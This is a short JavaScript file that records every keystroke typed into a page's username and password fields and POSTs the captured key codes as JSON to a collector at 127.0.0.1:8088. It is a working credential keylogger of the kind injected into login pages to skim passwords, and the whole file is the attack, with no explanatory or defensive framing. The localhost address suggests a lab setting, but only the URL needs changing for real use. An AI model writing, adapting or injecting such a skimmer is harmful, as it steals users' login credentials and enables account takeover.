var keys1 = [];
var keys2 = [];

function login(){
    document.querySelector("#username").addEventListener("keydown", function(event) {
        var keyCode1 = event.keyCode;
        keys1.push(keyCode1);
    });
    document.querySelector("#password").addEventListener("keydown", function(event) {
        var keyCode2 = event.keyCode;
        keys2.push(keyCode2);
    });
}

function sender(){
    console.log(keys1);
    console.log(keys2);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://127.0.0.1:8088/");
    xhr.setRequestHeader("Content-Type", "application/json");
    var requestBody = {
        "user": keys1,
        "pass": keys2,
      };
    xhr.send(JSON.stringify(requestBody));
}